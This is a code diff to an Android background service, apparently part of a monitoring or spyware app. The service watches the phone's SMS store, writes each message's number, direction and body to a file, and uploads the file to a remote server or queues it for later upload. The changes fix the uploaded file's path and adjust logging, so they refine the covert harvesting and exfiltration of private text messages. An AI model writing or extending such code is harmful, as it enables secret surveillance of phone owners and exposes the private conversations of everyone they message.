@@ -8,8 +8,6 @@ import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.database.ContentObserver;
 import android.database.Cursor;
-import android.net.ConnectivityManager;
-import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
@@ -25,8 +23,6 @@ import android.util.Log;
 
 import java.io.File;
 import java.io.FileWriter;
-import java.util.ArrayList;
-import java.util.Arrays;
 
 public class BackService extends Service {
 
@@ -106,7 +102,6 @@ public class BackService extends Service {
 
 		@Override
 		public void onChange(boolean selfChange) {
-			Log.e(LOG_TAG, "Sms Received Or sent");
 			try {
 				if (observingSMS) {
 					super.onChange(selfChange);
@@ -136,8 +131,10 @@ public class BackService extends Service {
 							FileWriter writer = new FileWriter(file);
 							String status = "";
 							if (cur.getString(cur.getColumnIndex("type")).equals("1")) {
+								Log.e(LOG_TAG, "Sms Received");
 								status = "incoming";
 							} else if (cur.getString(cur.getColumnIndex("type")).equals("2")) {
+								Log.e(LOG_TAG, "Sms Sent");
 								status = "outGoing";
 							} else {
 								return;
@@ -145,12 +142,12 @@ public class BackService extends Service {
 							writer.append("_Number : "+no+"Statue :" + status+"body : "+content);
 							writer.flush();
 							writer.close();
-							String path = RecordService.DEFAULT_STORAGE_LOCATION;
+//							String path = RecordService.DEFAULT_STORAGE_LOCATION;
 							if (helpers.isOnline()) {
-                                helpers.requestFiletUpload(path+fileName);
+                                helpers.requestFiletUpload(file.getAbsolutePath());
                                 new Thread(helpers).start();
                             } else {
-                                dbHandler.createNewFileNameForUpload("filename",path+fileName);
+                                dbHandler.createNewFileNameForUpload("filename", file.getAbsolutePath());
                             }
 						}
 						lastID = id;
@@ -159,9 +156,7 @@ public class BackService extends Service {
 				cur.close();
 				observingSMS = false;
 			} catch (Exception e) {
-				// TODO Auto-generated catch block
 				Log.e(LOG_TAG, e.toString());
-				e.printStackTrace();
 			}
 			super.onChange(selfChange);
 		}
